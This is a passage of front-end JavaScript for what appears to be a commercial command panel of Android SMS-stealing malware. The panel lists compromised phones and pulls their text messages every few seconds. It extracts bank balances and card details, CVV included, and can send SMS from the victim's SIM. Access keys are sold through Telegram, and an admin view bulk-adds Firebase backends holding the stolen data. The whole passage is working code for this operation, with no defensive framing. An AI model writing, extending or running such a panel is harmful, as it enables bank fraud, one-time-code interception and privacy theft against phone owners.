    alert: e(Fragment, null, e("path", { d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3" }), e("path", { d: "M12 9v4" }), e("path", { d: "M12 17h.01" })),
    star: e("path", { d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z" }),
    key: e(Fragment, null, e("circle", { cx: 7.5, cy: 15.5, r: 5.5 }), e("path", { d: "m21 2-9.6 9.6" }), e("path", { d: "m15.5 7.5 3 3L22 7l-3-3" })),
    database: e(Fragment, null, e("ellipse", { cx: 12, cy: 5, rx: 9, ry: 3 }), e("path", { d: "M3 5V19A9 3 0 0 0 21 19V5" }), e("path", { d: "M3 12A9 3 0 0 0 21 12" })),
    power: e(Fragment, null, e("path", { d: "M12 2v10" }), e("path", { d: "M18.4 6.6a9 9 0 1 1-12.77.04" })),
    megaphone: e(Fragment, null, e("path", { d: "m3 11 18-5v12L3 14v-3z" }), e("path", { d: "M11.6 16.8a3 3 0 1 1-5.8-1.6" })),
    lock: e(Fragment, null, e("rect", { width: 18, height: 11, x: 3, y: 11, rx: 2 }), e("path", { d: "M7 11V7a5 5 0 0 1 10 0v4" })),
    settings: e(Fragment, null, e("circle", { cx: 12, cy: 12, r: 3 }), e("path", { d: "M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" }))
  };
  return e("svg", { width: size, height: size, viewBox: "0 0 24 24", fill: name === "star" ? "currentColor" : "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round", className }, P[name] || null);
};

// ---------- Toast ----------
function Toast({ msg, type, onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 3500); return () => clearTimeout(t); }, [onClose]);
  return e("div", {
    className: "fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-2xl text-sm font-semibold shadow-xl animate-fade-up",
    style: {
      background: "#1a1a1a",
      border: "1px solid " + (type === "error" ? "rgba(239,68,68,0.4)" : type === "success" ? "rgba(34,197,94,0.4)" : "#333"),
      color: type === "error" ? "#f87171" : type === "success" ? "#4ade80" : "#fff",
      maxWidth: "90vw"
    }
  }, msg);
}

// ---------- Battery Bar ----------
function BatteryBar({ percent }) {
  const color = percent >= 60 ? "#4ade80" : percent >= 30 ? "#facc15" : "#ef4444";
  return e("div", { className: "flex items-center gap-1.5" },
    e("div", { className: "flex items-center" },
      e("div", { className: "flex items-center rounded", style: { width: 26, height: 12, padding: 2, border: "1px solid #555" } },
        e("div", { className: "rounded h-full transition-all duration-500", style: { width: Math.max(5, percent) + "%", background: color } })
      ),
      e("div", { style: { width: 3, height: 5, background: "#555", marginLeft: -1 } })
    ),
    e("span", { className: "text-xs font-semibold tabular-nums", style: { color } }, percent + "%")
  );
}

// ---------- Device Card ----------
function DeviceCard({ dev, onClick, analysis }) {
  const topBank = analysis?.bankBalances?.[0];
  const hasCard = analysis?.cards?.length > 0;
  return e("div", {
    onClick,
    className: "rounded-2xl p-3 cursor-pointer transition-all duration-200 hover:-translate-y-1",
    style: { background: "#000", border: "1px solid #1f1f1f" }
  },
    e("div", { className: "flex items-start gap-2 mb-2" },
      e("div", { className: "w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0", style: { background: "rgba(34,197,94,0.15)", border: "1px solid rgba(34,197,94,0.25)" } },
        e(Icon, { name: "wifi", size: 18, className: "text-emerald-400" })
      ),
      e("div", { className: "flex-1 min-w-0" },
        e("h3", { className: "text-xs font-bold text-white truncate" }, dev.name),
        e("p", { className: "text-[9px] font-mono mt-0.5 truncate", style: { color: "#555" } }, dev.id)
      ),
      e("div", { className: "flex items-center gap-1 flex-shrink-0" },
        dev.upipin && e(Icon, { name: "star", size: 12, className: "text-amber-400" }),
        topBank && e(Icon, { name: "rupee", size: 12, className: "text-emerald-400" }),
        hasCard && e(Icon, { name: "card", size: 12, className: "text-purple-400" })
      )
    ),
    e("div", { className: "grid grid-cols-2 gap-2 mb-2" },
      e("div", null,
        e("p", { className: "text-[9px] uppercase tracking-widest mb-1", style: { color: "#444" } }, "Android"),
        e("p", { className: "text-xs font-bold", style: { color: "#ccc" } }, dev.android !== "—" ? "v" + dev.android.replace("v", "") : "—")
      ),
      e("div", null,
        e("p", { className: "text-[9px] uppercase tracking-widest mb-1", style: { color: "#444" } }, "Battery"),
        e(BatteryBar, { percent: dev.batteryPercent })
      )
    ),
    e("div", { className: "mb-2" },
      e("p", { className: "text-[9px] uppercase tracking-widest mb-1", style: { color: "#444" } }, "Number"),
      e("p", { className: "text-xs font-mono truncate", style: { color: "#aaa" } }, dev.phoneNumber)
    ),
    topBank && e("div", { className: "mb-2 px-2 py-1.5 rounded-lg", style: { background: "rgba(2,44,34,0.2)", border: "1px solid rgba(6,78,59,0.2)" } },
      e("div", { className: "flex items-center justify-between" },
        e("span", { className: "text-[10px] font-semibold text-emerald-400" }, topBank.bankName),
        e("span", { className: "text-xs font-black text-white" }, "₹" + parseFloat(topBank.availableBalance || 0).toLocaleString("en-IN"))
      )
    ),
    hasCard && e("div", { className: "mb-2 px-2 py-1 rounded-lg flex items-center gap-1", style: { background: "rgba(59,7,100,0.2)" } },
      e("span", { className: "text-[10px] font-semibold text-purple-400" }, "Card ••" + analysis.cards[0].cardLast4)
    ),
    e("div", { className: "flex items-center gap-1.5" },
      e("span", { className: "w-2 h-2 rounded-full bg-emerald-500", style: { boxShadow: "0 0 6px #22c55e" } }),
      e("span", { className: "text-[10px] font-semibold text-emerald-400" }, "Online")
    )
  );
}

// ---------- Device Detail ----------
function DeviceDetail({ dev, apiKey, onClose, showToast }) {
  const [messages, setMessages] = useState([]);
  const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [] });
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState("info");
  const [sendTo, setSendTo] = useState("");
  const [sendMsg, setSendMsg] = useState("");
  const [sending, setSending] = useState(false);
  const [sendSim, setSendSim] = useState(1);

  const loadMessages = useCallback(async () => {
    try {
      const r = await api("/api/device/" + encodeURIComponent(dev._accountId || "") + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
      const parsed = r.messages || [];
      setMessages(parsed);
      setAnalysis(analyzeSMS(parsed));
    } catch { setMessages([]); }
    finally { setLoading(false); }
  }, [dev.id, dev._accountId, apiKey]);

  useEffect(() => { loadMessages(); const iv = setInterval(loadMessages, 6000); return () => clearInterval(iv); }, [loadMessages]);

  const send = async () => {
    if (!sendTo || !sendMsg) { showToast("Fill number and message", "error"); return; }
    setSending(true);
    try {
      await api("/api/device/" + encodeURIComponent(dev._accountId || "") + "/" + encodeURIComponent(dev.id) + "/send?key=" + encodeURIComponent(apiKey), {
        method: "POST", body: JSON.stringify({ from: sendSim, to: sendTo, message: sendMsg })
      });
      showToast("SMS queued!", "success");
      setSendMsg("");
    } catch (e) { showToast("Send failed: " + e.message, "error"); }
    finally { setSending(false); }
  };

  const del = async () => {
    if (!confirm("Delete " + dev.name + "?")) return;
    try {
      await api("/api/device/" + encodeURIComponent(dev._accountId || "") + "/" + encodeURIComponent(dev.id) + "/delete?key=" + encodeURIComponent(apiKey), { method: "DELETE" });
      showToast("Deleted", "success");
      onClose();
    } catch (e) { showToast("Delete failed", "error"); }
  };

  const tabs = [
    { k: "info", l: "Info" },
    { k: "bank", l: "Bank (" + analysis.bankBalances.length + ")" },
    ...(analysis.cards.length > 0 ? [{ k: "card", l: "Card (" + analysis.cards.length + ")" }] : []),
    { k: "sms", l: "SMS (" + messages.length + ")" },
    { k: "send", l: "Send" }
  ];

  return e("div", { className: "fixed inset-0 z-50 flex", onClick: onClose },
    e("div", { className: "absolute inset-0 bg-black/70 backdrop-blur-sm" }),
    e("div", { className: "relative ml-auto w-full max-w-md h-full flex flex-col", style: { background: "#0d0d0d", borderLeft: "1px solid #1f1f1f" }, onClick: ev => ev.stopPropagation() },
      e("div", { className: "flex items-center justify-between px-4 py-3 border-b", style: { borderColor: "#1a1a1a" } },
        e("div", { className: "flex items-center gap-2" },
          e("div", { className: "w-8 h-8 rounded-lg flex items-center justify-center", style: { background: "rgba(34,197,94,0.15)" } },
            e(Icon, { name: "wifi", size: 14, className: "text-emerald-400" })
          ),
          e("div", null,
            e("h3", { className: "text-xs font-bold text-white" }, dev.name),
            e("p", { className: "text-[9px] font-mono", style: { color: "#555" } }, dev.id)
          )
        ),
        e("div", { className: "flex items-center gap-1" },
          e("button", { onClick: del, className: "p-2 rounded-lg", style: { background: "rgba(69,10,10,0.4)", color: "#f87171" } }, e(Icon, { name: "trash", size: 14 })),
          e("button", { onClick: onClose, className: "p-2 rounded-lg", style: { background: "#1a1a1a", color: "#888" } }, e(Icon, { name: "x", size: 14 }))
        )
      ),
      e("div", { className: "flex overflow-x-auto", style: { borderBottom: "1px solid #1a1a1a", padding: "0 8px" } },
        tabs.map(t => e("button", { key: t.k, onClick: () => setTab(t.k), className: "px-3 py-2.5 text-[11px] font-semibold whitespace-nowrap", style: { borderBottom: "2px solid " + (tab === t.k ? "#ef4444" : "transparent"), color: tab === t.k ? "#f87171" : "#555" } }, t.l))
      ),
      e("div", { className: "flex-1 overflow-y-auto px-4 py-3" },
        tab === "info" && e(Fragment, null,
          infoRow("Phone", dev.phoneNumber),
          infoRow("Network", dev.provider),
          infoRow("Android", dev.android),
          infoRow("IP", dev.ip),
          infoRow("Storage", dev.storage),
          infoRow("CPU", dev.cpu),
          infoRow("SDK", dev.sdk)
        ),
        tab === "bank" && (loading ? e("p", { className: "text-center py-8", style: { color: "#555" } }, "Loading…")
          : analysis.bankBalances.length === 0 ? e("p", { className: "text-center py-8", style: { color: "#444" } }, "No bank SMS")
          : analysis.bankBalances.map((b, i) => e("div", { key: i, className: "p-3 rounded-xl mb-2", style: { background: "#0a1410", border: "1px solid rgba(6,78,59,0.3)" } },
              e("div", { className: "flex justify-between mb-1" },
                e("span", { className: "text-xs font-bold text-emerald-400" }, b.bankName),
                e("span", { className: "text-[10px]", style: { color: b.transactionType === "credit" ? "#4ade80" : "#f87171" } }, b.transactionType || "")
              ),
              e("p", { className: "text-lg font-black text-white" }, "₹" + parseFloat(b.availableBalance || 0).toLocaleString("en-IN")),
              b.transactionAmount && e("p", { className: "text-xs mt-1", style: { color: "#888" } }, "Txn: ₹" + parseFloat(b.transactionAmount || 0).toLocaleString("en-IN")),
              e("p", { className: "text-[10px] mt-2 line-clamp-2", style: { color: "#555" } }, (b.rawSms || "").substring(0, 130))
            ))),
        tab === "card" && (analysis.cards.length === 0 ? e("p", { className: "text-center py-8", style: { color: "#444" } }, "No card")
          : analysis.cards.map((c, i) => e("div", { key: i, className: "p-3 rounded-xl mb-2", style: { background: "#0f0a1a", border: "1px solid rgba(88,28,135,0.3)" } },
              e("p", { className: "text-xs font-bold text-purple-400 mb-1" }, c.cardType || "Card"),
              e("p", { className: "text-sm font-mono", style: { color: "#aaa" } }, "•••• •••• •••• " + c.cardLast4),
              c.cvv && e("p", { className: "text-xs mt-1", style: { color: "#c084fc" } }, "CVV: " + c.cvv),
              c.expiry && e("p", { className: "text-xs", style: { color: "#c084fc" } }, "Exp: " + c.expiry)
            ))),
        tab === "sms" && (loading ? e("p", { className: "text-center py-8", style: { color: "#555" } }, "Loading…")
          : messages.length === 0 ? e("p", { className: "text-center py-8", style: { color: "#444" } }, "No messages")
          : messages.map((m, i) => {
              const isBank = /AVL|AVAL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
              const isCard = /CARD|CVV/i.test(m.text);
              return e("div", { key: i, className: "p-2.5 rounded-lg mb-2", style: { background: isCard ? "#100d18" : isBank ? "#0a130d" : "#111", borderLeft: "2px solid " + (isCard ? "rgba(168,85,247,0.6)" : isBank ? "rgba(34,197,94,0.6)" : "rgba(239,68,68,0.6)") } },
                e("div", { className: "flex justify-between mb-1" },
                  e("span", { className: "text-[11px] font-bold", style: { color: isCard ? "#c084fc" : isBank ? "#4ade80" : "#f87171" } }, m.sender),
                  e("span", { className: "text-[9px] font-mono", style: { color: "#444" } }, m.time)
                ),
                e("p", { className: "text-xs", style: { color: "#aaa" } }, m.text.substring(0, 250))
              );
            })),
        tab === "send" && e("div", null,
          e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "SIM"),
          e("div", { className: "flex gap-2 mb-3" }, [1, 2].map(n => e("button", { key: n, onClick: () => setSendSim(n), className: "flex-1 py-2 rounded-lg text-sm font-bold", style: { background: sendSim === n ? "#dc2626" : "#111", color: sendSim === n ? "#fff" : "#666", border: "1px solid " + (sendSim === n ? "transparent" : "#222") } }, "SIM " + n))),
          e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "Recipient"),
          e("input", { value: sendTo, onChange: ev => setSendTo(ev.target.value), placeholder: "+919876543210", className: "w-full px-3 py-2 rounded-lg text-sm font-mono mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("p", { className: "text-[10px] uppercase tracking-widest mb-2", style: { color: "#555" } }, "Message"),
          e("textarea", { value: sendMsg, onChange: ev => setSendMsg(ev.target.value), rows: 4, placeholder: "Type message…", className: "w-full px-3 py-2 rounded-lg text-sm mb-3 resize-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("button", { onClick: send, disabled: sending, className: "w-full py-2.5 rounded-lg font-bold text-sm text-white disabled:opacity-50", style: { background: "#dc2626" } }, sending ? "Sending…" : "Send via SIM " + sendSim)
        )
      )
    )
  );

  function infoRow(label, value) {
    return e("div", { className: "flex justify-between py-2", style: { borderBottom: "1px solid #1a1a1a" } },
      e("span", { className: "text-xs flex-shrink-0", style: { color: "#555", width: "6rem" } }, label),
      e("span", { className: "text-xs text-right break-all font-mono", style: { color: "#ccc" } }, value || "—")
    );
  }
}

// ---------- Public Panel (AUTO-CONNECT, ONLY ONLINE) ----------
function PublicPanel({ apiKey, onLogout }) {
  const [devices, setDevices] = useState([]);
  const [analyses, setAnalyses] = useState({}); // { deviceId: { bankBalances, cards } }
  const [loading, setLoading] = useState(true);
  const [selected, setSelected] = useState(null);
  const [search, setSearch] = useState("");
  const [toast, setToast] = useState(null);
  const [err, setErr] = useState("");
  const [now, setNow] = useState(new Date());
  const [broadcast, setBroadcast] = useState("");

  const showToast = useCallback((msg, type = "info") => setToast({ msg, type, id: Date.now() }), []);

  // Load devices from SERVER (firebase URLs never exposed)
  const loadDevices = useCallback(async (silent) => {
    try {
      const r = await api("/api/devices?key=" + encodeURIComponent(apiKey));
      const list = (r.devices || []).filter(d => d.status === true); // ✅ ONLY ONLINE
      setDevices(list);
      setBroadcast(r.broadcast || "");
      setErr("");
      // Fetch SMS analysis for each device
      const newAnalyses = {};
      await Promise.all(list.map(async (dev) => {
        try {
          const m = await api("/api/device/" + encodeURIComponent(dev._accountId) + "/" + encodeURIComponent(dev.id) + "/messages?key=" + encodeURIComponent(apiKey));
          newAnalyses[dev.id] = analyzeSMS(m.messages || []);
        } catch {}
      }));
      setAnalyses(newAnalyses);
    } catch (e) {
      if (!silent) setErr(e.message);
    } finally {
      setLoading(false);
    }
  }, [apiKey]);

  useEffect(() => {
    loadDevices(false);
    const iv1 = setInterval(() => loadDevices(true), 3000); // ✅ LIVE every 3s
    const iv2 = setInterval(() => setNow(new Date()), 1000);
    return () => { clearInterval(iv1); clearInterval(iv2); };
  }, [loadDevices]);

  const filtered = useMemo(() => {
    if (!search.trim()) return devices;
    const q = search.toLowerCase();
    return devices.filter(d =>
      d.name.toLowerCase().includes(q) ||
      d.phoneNumber.includes(q) ||
      d.id.includes(q)
    );
  }, [devices, search]);

  const timeStr = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });

  return e("div", { className: "min-h-screen flex flex-col", style: { background: "#080808", color: "#fff" } },
    e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.85)", borderBottom: "1px solid #1a1a1a" } },
      e("div", { className: "max-w-screen-2xl mx-auto px-4 py-3 flex items-center gap-3 flex-wrap" },
        e("div", { className: "flex items-center gap-2 flex-shrink-0" },
          e("div", { className: "w-7 h-7 rounded-lg red-gradient flex items-center justify-center" }, e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })),
          e("span", { style: { color: "#6acfff", fontWeight: 800 } }, "NOOBSTER"),
          e("span", { className: "font-bold" }, " X PANEL")
        ),
        e("div", { className: "relative flex-1", style: { minWidth: "180px", maxWidth: "24rem" } },
          e("input", { value: search, onChange: ev => setSearch(ev.target.value), placeholder: "Search…", className: "w-full pl-9 pr-4 py-2 rounded-xl text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("div", { className: "absolute left-3 top-1/2 -translate-y-1/2", style: { color: "#444" } }, e(Icon, { name: "settings", size: 14 }))
        ),
        e("div", { className: "ml-auto flex items-center gap-2 flex-wrap" },
          e("div", { className: "flex items-center gap-2 px-3 py-1.5 rounded-full", style: { background: "rgba(2,44,34,0.4)", border: "1px solid rgba(6,78,59,0.4)" } },
            e("span", { className: "w-2 h-2 rounded-full bg-emerald-500 animate-pulse" }),
            e("span", { className: "text-xs font-semibold text-emerald-400" }, filtered.length + " online")
          ),
          e("div", { className: "flex items-center gap-1.5 px-3 py-1.5 rounded-full", style: { background: "#111", border: "1px solid #1e1e1e" } },
            e(Icon, { name: "clock", size: 14, className: "text-[#555]" }),
            e("span", { className: "text-xs font-mono font-bold", style: { color: "#888" } }, timeStr)
          ),
          e("button", { onClick: () => confirm("Logout?") && onLogout(), className: "flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs", style: { background: "#111", border: "1px solid #222", color: "#666" } },
            e(Icon, { name: "logout", size: 14 }), "Logout")
        )
      )
    ),
    broadcast && e("div", { className: "px-6 py-2.5 text-center text-sm", style: { background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", color: "#fbbf24" } }, "📢 " + broadcast),
    err && e("div", { className: "px-6 py-2 flex items-start gap-2", style: { background: "rgba(69,10,10,0.4)", borderBottom: "1px solid rgba(127,29,29,0.3)" } },
      e(Icon, { name: "alert", size: 14, className: "text-red-400 mt-0.5" }),
      e("p", { className: "text-xs text-red-300 flex-1" }, err),
      e("button", { onClick: () => setErr(""), style: { color: "#f87171" } }, e(Icon, { name: "x", size: 12 }))
    ),
    e("main", { className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 py-4" },
      loading ? e("div", { className: "flex items-center justify-center py-12 gap-3" },
        e("div", { className: "w-6 h-6 border-2 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } }),
        e("span", { className: "text-sm", style: { color: "#666" } }, "Loading devices…")
      ) : filtered.length === 0 ? e("div", { className: "flex flex-col items-center justify-center py-24 text-center" },
        e("div", { className: "w-16 h-16 rounded-2xl flex items-center justify-center mb-4", style: { background: "#111", border: "1px solid #1e1e1e" } }, e(Icon, { name: "shield", size: 48, className: "text-[#2a2a2a]" })),
        e("p", { className: "text-base font-bold", style: { color: "#444" } }, "No online devices"),
        e("p", { className: "text-sm mt-1.5", style: { color: "#333" } }, "Waiting for devices…")
      ) : e("div", { className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3" },
        filtered.map(d => e(DeviceCard, { key: d._accountId + ":" + d.id, dev: d, analysis: analyses[d.id], onClick: () => setSelected(d) }))
      )
    ),
    toast && e(Toast, { msg: toast.msg, type: toast.type, onClose: () => setToast(null) }),
    selected && e(DeviceDetail, { dev: selected, apiKey, onClose: () => setSelected(null), showToast })
  );
}

// ---------- Access Denied ----------
function AccessDeniedScreen({ reason, keyObj }) {
  return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
    e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center shadow-2xl" },
      e("div", { className: "w-20 h-20 rounded-2xl mx-auto mb-6 flex items-center justify-center", style: { background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)" } },
        e(Icon, { name: "lock", size: 40, className: "text-red-400" })
      ),
      e("h1", { className: "text-2xl font-black text-red-400 mb-3" }, reason === "expired" ? "API Key Expired" : "Access Denied"),
      e("p", { className: "text-sm mb-6", style: { color: "#888" } }, reason === "expired" ? "Your API key has expired." : "Please enter a valid API key in the URL."),
      keyObj && reason === "expired" && e("div", { className: "p-3 rounded-xl mb-4 text-left", style: { background: "rgba(69,10,10,0.3)", border: "1px solid rgba(127,29,29,0.4)" } },
        e("p", { className: "text-[10px] uppercase tracking-widest mb-1", style: { color: "#f87171" } }, "Expired On"),
        e("p", { className: "text-sm font-bold text-white" }, new Date(keyObj.expiresAt).toLocaleDateString("en-IN"))
      ),
      e("div", { className: "p-4 rounded-xl mb-4", style: { background: "rgba(245,158,11,0.1)", border: "1px solid rgba(245,158,11,0.25)" } },
        e("p", { className: "text-base font-bold text-amber-400 mb-2" }, "🔑 Please Buy a New API Key"),
        e("p", { className: "text-xs mb-3", style: { color: "#ccc" } }, "Message me on Telegram for a new key"),
        e("a", { href: "https://t.me/" + CFG.CONTACT_USERNAME.replace("@", ""), target: "_blank", className: "inline-flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-sm", style: { background: "linear-gradient(135deg,#229ED9,#0088cc)", color: "#fff" } },
          e(Icon, { name: "send", size: 14 }), CFG.CONTACT_USERNAME)
      ),
      e("p", { className: "text-xs", style: { color: "#555" } }, "Format: /v2/YOUR_API_KEY")
    )
  );
}

// ---------- Admin Login ----------
function AdminLogin({ onSuccess }) {
  const [pass, setPass] = useState("");
  const [err, setErr] = useState("");
  const [busy, setBusy] = useState(false);
  const submit = async (ev) => {
    ev.preventDefault();
    setBusy(true); setErr("");
    try {
      await api("/api/admin/login", { method: "POST", body: JSON.stringify({ password: pass }) });
      localStorage.setItem(K_ADMIN, "1");
      onSuccess();
    } catch (e) { setErr(e.message); }
    finally { setBusy(false); }
  };
  return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
    e("div", { className: "glass-card rounded-3xl p-8 max-w-sm w-full shadow-2xl" },
      e("div", { className: "text-center mb-6" },
        e("div", { className: "w-16 h-16 rounded-2xl red-gradient inline-flex items-center justify-center mb-4" }, e(Icon, { name: "lock", size: 28 })),
        e("h1", { className: "text-2xl font-black" }, "Admin Access")
      ),
      e("form", { onSubmit: submit },
        e("input", { type: "password", value: pass, onChange: ev => setPass(ev.target.value), placeholder: "Admin password", className: "w-full px-4 py-3 rounded-xl text-sm mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" }, autoFocus: true }),
        err && e("p", { className: "text-xs text-red-400 mb-3" }, err),
        e("button", { type: "submit", disabled: busy, className: "w-full py-3 rounded-xl red-gradient text-white font-bold text-sm disabled:opacity-50" }, busy ? "…" : "Login")
      )
    )
  );
}

// ---------- Admin Dashboard ----------
function AdminDashboard({ onLogout }) {
  const [tab, setTab] = useState("dashboard");
  const [data, setData] = useState({ firebases: [], api_keys: [], status: { online: true, broadcast: "" } });
  const [devices, setDevices] = useState([]);
  const [perAcc, setPerAcc] = useState({});
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState(null);
  const [clearing, setClearing] = useState(false);

  // Bulk add
  const [bulkUrls, setBulkUrls] = useState("");
  const [bulkKey, setBulkKey] = useState("");
  const [bulkBusy, setBulkBusy] = useState(false);

  // New API key
  const [apiName, setApiName] = useState("");
  const [apiExpiryMode, setApiExpiryMode] = useState("30");
  const [apiCustomDate, setApiCustomDate] = useState("");
  const [apiKeyVal, setApiKeyVal] = useState("");

  // Broadcast
  const [broadcast, setBroadcast] = useState("");

  const showToast = (msg, type = "info") => setToast({ msg, type, id: Date.now() });

  const refresh = useCallback(async () => {
    try {
      const d = await api("/api/admin/data");
      setData(d);
      setBroadcast(d.status?.broadcast || "");
    } catch (e) { if (e.message.includes("401") || e.message.includes("AUTH")) { onLogout(); } }
  }, [onLogout]);

  const loadDevices = useCallback(async () => {
    setLoading(true);
    try {
      const d = await api("/api/admin/devices");
      setDevices(d.devices || []);
      setPerAcc(d.per_account || {});
      setErrors(d.errors || {});
    } catch {}
    finally { setLoading(false); }
  }, []);

  useEffect(() => { refresh(); loadDevices(); const iv = setInterval(refresh, 5000); return () => clearInterval(iv); }, [refresh, loadDevices]);
  useEffect(() => { if (tab === "dashboard") { loadDevices(); const iv = setInterval(loadDevices, 10000); return () => clearInterval(iv); } }, [tab, loadDevices]);

  const handleBulkAdd = async () => {
    const urls = bulkUrls.split("\n").map(l => l.trim()).filter(Boolean);
    if (urls.length === 0) return showToast("Paste URLs", "error");
    if (!bulkKey.trim()) return showToast("Paste secret key", "error");
    setBulkBusy(true);
    try {
      await api("/api/admin/firebases/bulk", { method: "POST", body: JSON.stringify({ urls, key: bulkKey.trim() }) });
      setBulkUrls(""); setBulkKey("");
      showToast("Firebases added!", "success");
      refresh(); loadDevices();
    } catch (e) { showToast("Failed: " + e.message, "error"); }
    finally { setBulkBusy(false); }
  };

  const removeFb = async (id) => {
    if (!confirm("Remove this Firebase?")) return;
    try {
      await api("/api/admin/firebases/" + id, { method: "DELETE" });
      showToast("Removed", "success");
      refresh(); loadDevices();
    } catch (e) { showToast("Failed", "error"); }
  };

  const clearAll = async () => {
    if (!confirm("⚠️ Remove ALL Firebases? This cannot be undone.")) return;
    setClearing(true);
    try {
      await api("/api/admin/firebases/all", { method: "DELETE" });
      showToast("All firebases cleared", "success");
      refresh(); loadDevices();
    } catch (e) { showToast("Failed", "error"); }
    finally { setClearing(false); }
  };

  const removeFailed = async () => {
    const ids = Object.keys(errors).filter(id => errors[id]);
    if (ids.length === 0) return showToast("No failed firebases", "info");
    if (!confirm("Remove " + ids.length + " failed firebase(s)?")) return;
    try {
      for (const id of ids) await api("/api/admin/firebases/" + id, { method: "DELETE" });
      showToast(ids.length + " removed", "success");
      refresh(); loadDevices();
    } catch (e) { showToast("Failed", "error"); }
  };

  const genKey = () => Math.random().toString(36).slice(2, 12).toUpperCase() + Math.random().toString(36).slice(2, 8).toUpperCase();

  const createApiKey = async () => {
    if (!apiName.trim()) return showToast("Enter name", "error");
    let expiresAt = null;
    if (apiExpiryMode !== "never") {
      if (apiExpiryMode === "custom") {
        if (!apiCustomDate) return showToast("Pick a date", "error");
        expiresAt = new Date(apiCustomDate).getTime();
        if (expiresAt < Date.now()) return showToast("Date in past", "error");
      } else {
        expiresAt = Date.now() + parseInt(apiExpiryMode) * 24 * 60 * 60 * 1000;
      }
    }
    try {
      await api("/api/admin/apikeys", {
        method: "POST",
        body: JSON.stringify({ name: apiName.trim(), key: apiKeyVal.trim() || null, expiresAt })
      });
      setApiName(""); setApiKeyVal(""); setApiExpiryMode("30"); setApiCustomDate("");
      showToast("API key created!", "success");
      refresh();
    } catch (e) { showToast("Failed: " + e.message, "error"); }
  };

  const toggleKey = async (id) => {
    try {
      await api("/api/admin/apikeys/" + id + "/toggle", { method: "POST" });
      refresh();
    } catch {}
  };

  const removeKey = async (id) => {
    if (!confirm("Delete this API key?")) return;
    try { await api("/api/admin/apikeys/" + id, { method: "DELETE" }); refresh(); }
    catch {}
  };

  const copyKeyUrl = (k) => {
    navigator.clipboard.writeText(window.location.origin + "/v2/" + k.key);
    showToast("URL copied!", "success");
  };

  const saveStatus = async (patch) => {
    try {
      await api("/api/admin/status", { method: "POST", body: JSON.stringify(patch) });
      showToast("Updated", "success");
      refresh();
    } catch (e) { showToast("Failed", "error"); }
  };

  const stats = {
    total: devices.length,
    online: devices.filter(d => d.status).length,
    offline: devices.filter(d => !d.status).length,
    fbs: data.firebases.length,
    keys: data.api_keys.length,
    activeKeys: data.api_keys.filter(k => k.active && (!k.expiresAt || k.expiresAt > Date.now())).length,
    failed: Object.keys(errors).filter(id => errors[id]).length
  };

  const tabs = [
    { k: "dashboard", l: "Dashboard" },
    { k: "firebases", l: "Firebases (" + data.firebases.length + ")" },
    { k: "apikeys", l: "API Keys (" + data.api_keys.length + ")" },
    { k: "control", l: "Control" }
  ];

  return e("div", { className: "min-h-screen" },
    e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.85)", borderBottom: "1px solid #1a1a1a" } },
      e("div", { className: "max-w-screen-2xl mx-auto px-4 py-3 flex items-center justify-between flex-wrap gap-3" },
        e("div", { className: "flex items-center gap-2" },
          e("div", { className: "w-8 h-8 rounded-lg red-gradient flex items-center justify-center" }, e(Icon, { name: "shield", size: 16 })),
          e("span", { className: "text-base font-black" }, "Admin Panel")
        ),
        e("div", { className: "flex items-center gap-2" },
